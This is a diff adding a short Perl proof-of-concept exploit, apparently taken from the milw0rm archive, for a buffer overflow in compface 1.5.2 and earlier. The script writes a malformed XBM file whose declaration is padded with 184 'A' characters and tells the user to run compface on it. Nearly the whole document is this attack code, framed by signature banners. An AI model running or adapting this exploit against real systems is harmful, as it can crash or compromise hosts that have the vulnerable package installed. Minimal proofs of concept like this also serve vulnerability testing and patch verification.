@@ -1,0 +1,20 @@
+#!/usr/bin/perl
+#########################################################################
+####VIVA#ISLAM##################################################ALLAH####
+#########################################################################
+# compface <= 1.5.2 bufer overflow p o c
+# vuln only excist on debian and ubuntu? - packages.debian.org/compface -
+# author: metalhoney ------- metalhoney1@hotmail.com -------
+#########################################################################
+open(ISLAM,">allah.xbm") or die;
+print ISLAM "#define noname_width 48\n#define noname_height 48\n";
+print ISLAM "static ";
+print ISLAM "A"x184;
+print ISLAM " char = {\n";
+close(ISLAM) or die;
+print "run now: compface allah.xbm\nmetalhoney signing off\nviva islam\n";
+#########################################################################
+####VIVA#ISLAM##################################################ALLAH####
+#########################################################################
+
+# milw0rm.com [2009-06-17]
